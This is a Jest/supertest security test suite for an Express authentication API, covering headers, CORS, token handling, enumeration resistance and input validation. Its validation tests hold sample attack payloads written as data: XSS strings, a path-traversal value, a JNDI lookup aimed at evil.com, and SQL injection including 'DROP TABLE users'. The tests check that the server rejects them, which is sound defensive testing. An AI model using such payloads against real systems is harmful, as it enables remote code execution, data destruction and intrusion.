import request from 'supertest';
import express from 'express';
import helmet from 'helmet';
import cors from 'cors';
import authRoutes from '../routes/auth';
import { authenticate } from '../middleware/auth';

// Create test app with security middleware
const createTestApp = () => {
  const app = express();
  
  // Security middleware
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        scriptSrc: ["'self'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"],
      },
    },
    crossOriginEmbedderPolicy: false,
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true
    }
  }));

  app.use(cors({
    origin: 'http://localhost:3333',
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
    exposedHeaders: ['RateLimit-Limit', 'RateLimit-Remaining', 'RateLimit-Reset']
  }));

  app.use(express.json({ limit: '10mb' }));
  app.use('/api/auth', authRoutes);

  // Protected test route
  app.get('/api/protected', authenticate, (req, res) => {
    res.json({
      success: true,
      data: {
        message: 'Access granted',
        user: req.user
      }
    });
  });

  return app;
};

describe('Security Tests', () => {
  let app: express.Application;

  beforeEach(() => {
    app = createTestApp();
  });

  describe('Security Headers', () => {
    it('should include security headers in responses', async () => {
      const response = await request(app)
        .get('/api/protected')
        .expect(401); // Will fail auth but should have headers

      // Check for Helmet security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('0');
      expect(response.headers['strict-transport-security']).toContain('max-age=31536000');
      expect(response.headers['content-security-policy']).toContain("default-src 'self'");
    });

    it('should include CORS headers for allowed origins', async () => {
      const response = await request(app)
        .options('/api/auth/login')
        .set('Origin', 'http://localhost:3333')
        .expect(204);

      expect(response.headers['access-control-allow-origin']).toBe('http://localhost:3333');
      expect(response.headers['access-control-allow-credentials']).toBe('true');
      expect(response.headers['access-control-allow-methods']).toContain('POST');
      expect(response.headers['access-control-allow-headers']).toContain('Authorization');
    });

    it('should reject requests from disallowed origins', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .set('Origin', 'http://malicious-site.com')
        .send({ email: 'test@example.com', password: 'password' });

      // Should not include CORS headers for disallowed origin
      expect(response.headers['access-control-allow-origin']).toBeUndefined();
    });
  });

  describe('Authentication Flow Security', () => {
    const validUserData = {
      email: 'security-test@example.com',
      username: 'securityuser',
      password: 'SecurePassword123!',
      firstName: 'Security',
      lastName: 'Test'
    };

    it('should handle complete authentication flow securely', async () => {
      // 1. Register user
      const registerResponse = await request(app)
        .post('/api/auth/register')
        .send(validUserData)
        .expect(201);

      expect(registerResponse.body.success).toBe(true);
      expect(registerResponse.body.data.user).toBeDefined();
      expect(registerResponse.body.data.user.passwordHash).toBeUndefined(); // Should not expose password hash

      // 2. Login user
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: validUserData.email,
          password: validUserData.password
        })
        .expect(200);

      expect(loginResponse.body.success).toBe(true);
      expect(loginResponse.body.data.tokens).toBeDefined();
      expect(loginResponse.body.data.tokens.accessToken).toBeDefined();
      expect(loginResponse.body.data.tokens.refreshToken).toBeDefined();

      const { accessToken, refreshToken } = loginResponse.body.data.tokens;

      // 3. Access protected resource
      const protectedResponse = await request(app)
        .get('/api/protected')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(200);

      expect(protectedResponse.body.success).toBe(true);
      expect(protectedResponse.body.data.user).toBeDefined();

      // 4. Refresh token
      const refreshResponse = await request(app)
        .post('/api/auth/refresh')
        .send({ refreshToken })
        .expect(200);

      expect(refreshResponse.body.success).toBe(true);
      expect(refreshResponse.body.data.accessToken).toBeDefined();

      // 5. Logout
      const logoutResponse = await request(app)
        .post('/api/auth/logout')
        .send({ refreshToken })
        .expect(200);

      expect(logoutResponse.body.success).toBe(true);

      // 6. Try to use refresh token after logout (should fail)
      await request(app)
        .post('/api/auth/refresh')
        .send({ refreshToken })
        .expect(401);
    });

    it('should prevent password enumeration attacks', async () => {
      // Try to login with non-existent email
      const response1 = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'nonexistent@example.com',
          password: 'anypassword'
        })
        .expect(401);

      // Try to login with existing email but wrong password
      await request(app)
        .post('/api/auth/register')
        .send(validUserData);

      const response2 = await request(app)
        .post('/api/auth/login')
        .send({
          email: validUserData.email,
          password: 'wrongpassword'
        })
        .expect(401);

      // Both should return the same generic error message
      expect(response1.body.error.message).toBe(response2.body.error.message);
      expect(response1.body.error.message).toContain('Invalid email or password');
    });

    it('should handle password reset securely', async () => {
      // Register user first
      await request(app)
        .post('/api/auth/register')
        .send(validUserData);

      // Request password reset for existing user
      const resetResponse1 = await request(app)
        .post('/api/auth/request-password-reset')
        .send({ email: validUserData.email })
        .expect(200);

      // Request password reset for non-existent user
      const resetResponse2 = await request(app)
        .post('/api/auth/request-password-reset')
        .send({ email: 'nonexistent@example.com' })
        .expect(200);

      // Both should return the same response to prevent email enumeration
      expect(resetResponse1.body.data.message).toBe(resetResponse2.body.data.message);
      expect(resetResponse1.body.data.message).toContain('If an account with that email exists');
    });
  });

  describe('Input Validation Security', () => {
    it('should reject malicious input in registration', async () => {
      const maliciousData = {
        email: '<script>alert("xss")</script>@example.com',
        username: '../../etc/passwd',
        password: 'password',
        firstName: '<img src=x onerror=alert(1)>',
        lastName: '${jndi:ldap://evil.com/a}'
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send(maliciousData)
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });

    it('should reject SQL injection attempts', async () => {
      const sqlInjectionData = {
        email: "admin@example.com'; DROP TABLE users; --",
        password: "password' OR '1'='1"
      };

      const response = await request(app)
        .post('/api/auth/login')
        .send(sqlInjectionData)
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });

    it('should reject oversized payloads', async () => {
      const oversizedData = {
        email: 'test@example.com',
        username: 'a'.repeat(10000), // Very long username
        password: 'password',
        firstName: 'b'.repeat(10000), // Very long first name
        lastName: 'Test'
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send(oversizedData)
        .expect(400);

      expect(response.body.success).toBe(false);
    });
  });

  describe('Token Security', () => {
    let accessToken: string;
    let refreshToken: string;

    beforeEach(async () => {
      // Register and login to get tokens
      const userData = {
        email: 'token-test@example.com',
        username: 'tokenuser',
        password: 'TokenPassword123!',
        firstName: 'Token',
        lastName: 'Test'
      };

      await request(app)
        .post('/api/auth/register')
        .send(userData);

      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: userData.email,
          password: userData.password
        });

      accessToken = loginResponse.body.data.tokens.accessToken;
      refreshToken = loginResponse.body.data.tokens.refreshToken;
    });

    it('should reject malformed tokens', async () => {
      const malformedTokens = [
        'not.a.token',
        'Bearer malformed',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.malformed',
        '',
        null,
        undefined
      ];

      for (const token of malformedTokens) {
        const response = await request(app)
          .get('/api/protected')
          .set('Authorization', token ? `Bearer ${token}` : '');

        expect(response.status).toBe(401);
        expect(response.body.success).toBe(false);
      }
    });

    it('should reject expired tokens', async () => {
      // This test would require mocking time or using a very short expiration
      // For now, we'll test with an obviously invalid token
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJleHAiOjE2MDk0NTkyMDB9.invalid';

      const response = await request(app)
        .get('/api/protected')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('INVALID_TOKEN');
    });

    it('should not accept refresh token as access token', async () => {
      const response = await request(app)
        .get('/api/protected')
        .set('Authorization', `Bearer ${refreshToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('INVALID_TOKEN');
    });

    it('should validate token format in validation endpoint', async () => {
      const response = await request(app)
        .post('/api/auth/validate')
        .send({ accessToken: 'invalid-token' })
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('TOKEN_VALIDATION_FAILED');
    });
  });

  describe('Error Handling Security', () => {
    it('should not expose sensitive information in error messages', async () => {
      // Test various error scenarios
      const errorTests = [
        {
          endpoint: '/api/auth/login',
          data: { email: 'test@example.com', password: 'wrong' },
          expectedStatus: 401
        },
        {
          endpoint: '/api/auth/refresh',
          data: { refreshToken: 'invalid' },
          expectedStatus: 401
        },
        {
          endpoint: '/api/auth/validate',
          data: { accessToken: 'invalid' },
          expectedStatus: 401
        }
      ];

      for (const test of errorTests) {
        const response = await request(app)
          .post(test.endpoint)
          .send(test.data)
          .expect(test.expectedStatus);

        expect(response.body.success).toBe(false);
        expect(response.body.error).toBeDefined();
        expect(response.body.error.message).toBeDefined();
        
        // Should not expose internal details
        expect(response.body.error.message).not.toContain('database');
        expect(response.body.error.message).not.toContain('sql');
        expect(response.body.error.message).not.toContain('stack');
        expect(response.body.error.message).not.toContain('internal');
        
        // Should have proper error structure
        expect(response.body.error.code).toBeDefined();
        expect(response.body.error.timestamp).toBeDefined();
      }
    });

    it('should handle internal server errors gracefully', async () => {
      // This would typically require mocking to force an internal error
      // For now, we'll test that the error structure is consistent
      const response = await request(app)
        .post('/api/auth/login')
        .send({ email: 'invalid-email-format' })
        .expect(400);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toHaveProperty('code');
      expect(response.body.error).toHaveProperty('message');
      expect(response.body.error).toHaveProperty('timestamp');
    });
  });

  describe('Content Security', () => {
    it('should enforce JSON content type', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .set('Content-Type', 'text/plain')
        .send('email=test@example.com&password=password');

      // Should reject non-JSON content
      expect(response.status).toBe(400);
    });

    it('should limit request size', async () => {
      // This test verifies that the express.json({ limit: '10mb' }) is working
      // In a real scenario, you'd test with actual large payloads
      const largeData = {
        email: 'test@example.com',
        password: 'password',
        extraData: 'a'.repeat(1000) // Reasonable size for testing
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send(largeData);

      // Should handle reasonable sized requests
      expect(response.status).not.toBe(413); // Payload Too Large
    });
  });
});